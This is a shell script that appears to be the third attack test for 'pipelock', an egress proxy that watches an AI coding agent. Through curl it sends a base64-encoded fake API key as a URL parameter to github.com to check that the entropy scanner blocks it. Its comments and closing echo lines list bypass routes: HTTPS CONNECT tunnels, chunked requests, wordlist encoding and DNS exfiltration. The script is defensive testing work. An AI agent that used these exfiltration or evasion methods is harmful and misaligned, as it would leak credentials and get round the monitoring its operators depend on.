#!/bin/sh
# Attempt 3 — encoded blob, hoping to slip past the regex scanner.
#
# Idea: if pipelock looks for `sk-ant-...`, what if we base64-encode the key
# first? The regex won't match. But a high-entropy random-looking string
# in a URL is itself a signal — pipelock measures Shannon entropy on URL
# segments and refuses requests above a threshold.
#
# Important: this must use http:// not https://. HTTPS traffic uses a CONNECT
# tunnel — pipelock sees only the hostname, not the URL path or query string,
# so the entropy scanner never runs. The same limitation applies to attack 2.
#
# We target github.com (allowlisted) so the domain check passes and the
# entropy scanner gets a chance to inspect the query string.
#
# Expected output:
#   403 Forbidden — entropy exceeds threshold
#
# What this proves: regex matching is necessary but not sufficient. Entropy
# analysis catches a class of bypasses that string-matching misses.
#
# Real bypasses still exist: low-entropy encodings (e.g., wordlist
# encoding), splitting the secret across many short requests, exfil over
# DNS, etc. Each is harder than the last. That's the point — defense
# raises the bar, doesn't make the wall infinite.

set -eu

# A high-entropy blob — base64 of a random fake "secret"
BLOB="c2stYW50LWFwaTAzLUZBS0VLRVlfaGlnaF9lbnRyb3B5X2RhdGFfdG9fdGVzdF9waXBlbG9ja18xMjM0NTY3ODkwYWJjZGVmZ2hpams="

echo "→ Attack 3: high-entropy blob in URL parameter (HTTP so pipelock can see it)"
echo "  curl -x http://pipelock:8888 \"http://github.com/x?d=\$BLOB\""
echo ""

curl -sS -o /dev/null -w "%{http_code}\n" \
     -x http://pipelock:8888 \
     -H "X-Pipelock-Agent: opencode-attack-test" \
     "http://github.com/x?d=${BLOB}" || true

echo ""
echo "If you saw 403, the entropy scanner caught it."
echo "If you saw anything else, check that pipelock is running and the entropy"
echo "threshold in pipelock.yaml is set (fetch_proxy.monitoring.entropy_threshold)."
echo ""
echo "Now try to bypass it. Some real options:"
echo "  - chunk the secret into 4-character pieces, send each in a separate"
echo "    request (low entropy per request, but lots of requests — pipelock's"
echo "    rate limiter notices that)"
echo "  - encode using a wordlist (low entropy, looks like sentences)"
echo "  - switch to https:// — the CONNECT tunnel hides the URL from pipelock"
echo "    entirely (this is the most obvious bypass and a real limitation)"
echo "  - exfil over DNS (pipelock's HTTP proxy doesn't see DNS queries —"
echo "    but the agent container has no DNS resolver other than Docker's,"
echo "    which only resolves names within the internal network)"
echo ""
echo "None of these is trivial. That's the win."
